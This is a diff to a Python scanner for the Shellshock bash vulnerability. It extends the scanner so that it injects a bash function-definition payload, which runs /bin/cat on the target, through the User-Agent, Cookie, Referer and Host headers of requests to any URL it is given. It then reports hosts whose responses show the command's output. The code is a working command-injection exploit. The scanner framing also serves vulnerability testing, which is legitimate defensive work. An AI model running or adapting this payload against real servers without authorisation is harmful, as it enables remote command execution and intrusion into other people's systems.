@@ -17,7 +17,7 @@ if (len(sys.argv)<=1) or (len(sys.argv)>2):
 '''
 user_agents = {1:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/protocols',
            }
-
+http_headers = ['User-Agent', 'Cookie', 'Referer', 'Host']
 o = urlparse(sys.argv[1])
 confirm = ' appears VULNERABLE!'
 allClear = ' does not appear VULNERABLE.'
@@ -25,19 +25,20 @@ allClear = ' does not appear VULNERABLE.'
 ## for each payload, launch request to check for shellshock
 for each in user_agents:
     query = o.scheme + '://' + o.netloc + o.path
-    results = requests.get(query, headers={'User-Agent':user_agents[each]})
-    soup = BeautifulSoup(results.text)
-    match = str(soup.body.p)
-    if (len(match)!= 0) or match != 'None':
-        if 'tcp' in match:
-            print ('Host: ' + query + confirm)
-            print ('Payload: ' + user_agents[each])
-            print(match[314:704])
-        elif 'root' in match:
-            print ('Host: ' + query + confirm)
-            print ('Payload: ' + user_agents[each])
-            print(match[3:35])
+    for heads in http_headers:
+        results = requests.get(query, headers={heads:user_agents[each]})
+        soup = BeautifulSoup(results.text)
+        match = str(soup.body.p)
+        if (len(match)!= 0) or match != 'None':
+            if 'tcp' in match:
+                print ('Host: ' + query + confirm)
+                print ('Payload: ' + heads + ':' + user_agents[each])
+                print(match[314:704])
+            elif 'root' in match:
+                print ('Host: ' + query + confirm)
+                print ('Payload: ' + heads + ':' + user_agents[each])
+                print(match[3:35])
+            else:
+                print(match)
         else:
-            print(match)
-    else:
-        print ('Host' + allClear)
+            print ('Host' + allClear)
